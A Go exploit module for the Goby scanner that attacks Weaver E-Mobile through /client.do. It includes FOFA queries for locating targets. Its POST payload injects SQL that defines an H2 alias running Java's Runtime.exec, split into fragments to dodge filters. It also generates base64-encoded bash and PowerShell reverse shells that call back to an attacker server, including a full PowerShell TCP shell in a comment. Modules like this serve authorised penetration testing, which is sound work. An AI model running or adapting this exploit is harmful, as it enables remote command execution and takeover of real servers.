package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Mobile /client.do Command Execution Vulnerability",
    "Description": "<p>Weaver E-Mobile is a mobile office application developed by WeChat Work Software Co., Ltd. in China. The software aims to provide enterprises with mobile office solutions, allowing employees to access internal systems and data via smartphones or tablets anytime and anywhere, thereby achieving the mobility, flexibility, and efficiency of work processes.</p><p>Weaver E-Mobile has a command execution vulnerability, allowing attackers to execute arbitrary commands through /client.do, thus gaining server privileges.</p>",
    "Product": "Weaver-EMobile",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-03-19",
    "PostTime": "2024-04-02",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "(body=\"content=\\\"WeaverE-mobile\\\"\"||(body=\"E-Mobile&nbsp;\"&&body=\"action=\\\"/verifyLogin.do\")||body=\"/images/login_logo@2x.png\"||(body=\"window.apiprifix=\\\"/emp\\\";\"&&title=\"移动管理平台\"))",
    "GobyQuery": "(body=\"content=\\\"WeaverE-mobile\\\"\"||(body=\"E-Mobile&nbsp;\"&&body=\"action=\\\"/verifyLogin.do\")||body=\"/images/login_logo@2x.png\"||(body=\"window.apiprifix=\\\"/emp\\\";\"&&title=\"移动管理平台\"))",
    "Level": "2",
    "Impact": "<p>Weaver E-Mobile has a command execution vulnerability, allowing attackers to execute arbitrary commands through /client.do, thus gaining server privileges.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "reverse_linux,reverse_windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/services/Transfer/isRemoteExistLastSnap",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/services/Transfer/isRemoteExistLastSnap"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "泛微E-Mobile /client.do 命令执行漏洞",
            "Product": "泛微-EMobile",
            "Description": "<p>泛微E-Mobile是中国泛微软件公司开发的一款移动办公应用软件。该软件旨在为企业提供移动办公解决方案，使员工可以随时随地通过手机或平板电脑访问企业内部系统和数据，实现工作流程的移动化、灵活化和高效化。<br></p><p>泛微E-Mobile存在命令执行漏洞，攻击者可以通过/client.do执行任意命令执行，从而获得服务器权限<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
            "Impact": "<p>泛微E-Mobile存在命令执行漏洞，攻击者可以通过/client.do执行任意命令执行，从而获得服务器权限<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Weaver E-Mobile /client.do Command Execution Vulnerability",
            "Product": "Weaver-EMobile",
            "Description": "<p>Weaver E-Mobile is a mobile office application developed by WeChat Work Software Co., Ltd. in China. The software aims to provide enterprises with mobile office solutions, allowing employees to access internal systems and data via smartphones or tablets anytime and anywhere, thereby achieving the mobility, flexibility, and efficiency of work processes.</p><p>Weaver E-Mobile has a command execution vulnerability, allowing attackers to execute arbitrary commands through /client.do, thus gaining server privileges.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
            "Impact": "<p>Weaver E-Mobile has a command execution vulnerability, allowing attackers to execute arbitrary commands through /client.do, thus gaining server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10940"
}`
	setPostRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (*httpclient.HttpResponse, error) {
		head := map[string]string{
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvVPZWWKFq310ISXS",
		}
		PostRequest := httpclient.NewPostRequestConfig("/client.do")
		PostRequest.VerifyTls = false
		PostRequest.FollowRedirect = false
		for headName, headValue := range head {
			PostRequest.Header.Store(headName, headValue)
		}
		PostRequest.Data = "------WebKitFormBoundaryvVPZWWKFq310ISXS\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ngetupload\r\n------WebKitFormBoundaryvVPZWWKFq310ISXS\r\nContent-Disposition: form-data; name=\"uploadID\"\r\n\r\n1';CREATE ALIAS if not exists abcd AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL abcd('" + command + "');--\r\n------WebKitFormBoundaryvVPZWWKFq310ISXS"
		if resp, err := httpclient.DoHttpRequest(hostInfo, PostRequest); resp != nil && resp.StatusCode == 200 {
			return resp, nil
		} else {
			return nil, err
		}
	}

	setReverseWaittingHash0001 := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
		select {
		case webConsleID := <-waitSessionCh:
			if u, err := url.Parse(webConsleID); err == nil {
				expResult.Success = true
				expResult.OutputType = "html"
				sid := strings.Join(u.Query()["id"], "")
				expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
			}
		case <-time.After(time.Second * 15):
		}
	}

	setReverseRequestHash0001 := func(reverseType string, isBase64 bool) (string, chan string, error) {
		typeList := map[string]string{
			"reverse_java":    "reverse_java",
			"reverse_windows": "reverse_windows",
			"reverse_linux":   "reverse_linux",
		}
		if revserTypeNew := typeList[reverseType]; revserTypeNew == "" {
			return "", nil, errors.New("reverse type error")
		}
		waitSessionCh := make(chan string)
		if rp, err := godclient.WaitSession(reverseType, waitSessionCh); err != nil || len(rp) >= 0 {
			if reverseType == "reverse_windows" {
				command := godclient.ReverseTCPByPowershell(rp)
				if isBase64 {
					//utf16Bytes := utf16.Encode([]rune("$client = New-Objezct System.Net.Sockets.TCPClient(\"" + godclient.GetGodServerIP() + "\"," + rp + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"))
					utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
					bytes := make([]byte, len(utf16Bytes)*2)
					for i, v := range utf16Bytes {
						bytes[i*2] = byte(v)
						bytes[i*2+1] = byte(v >> 8)
					}
					command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
				}
				return command, waitSessionCh, nil
			} else if reverseType == "reverse_linux" {
				command := godclient.ReverseTCPByBash(rp)
				if isBase64 {
					command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
				}
				return command, waitSessionCh, nil
			}
		}
		return "", waitSessionCh, errors.New("reverse port error")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := setPostRequestHash0001(hostInfo, "ipconfig"); resp != nil && strings.Contains(resp.RawBody, "Windows IP") {
				ss.VulURL = hostInfo.FixedHostInfo + "/client.do"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "cmd" {
				command := goutils.B2S(ss.Params["cmd"])
				if resp, err := setPostRequestHash0001(expResult.HostInfo, command); resp != nil && len(resp.RawBody) > 0 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			} else if attacktype == "reverse" {
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequestHash0001(reversetype, true); command != "" {
					go setPostRequestHash0001(expResult.HostInfo, command)
					setReverseWaittingHash0001(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
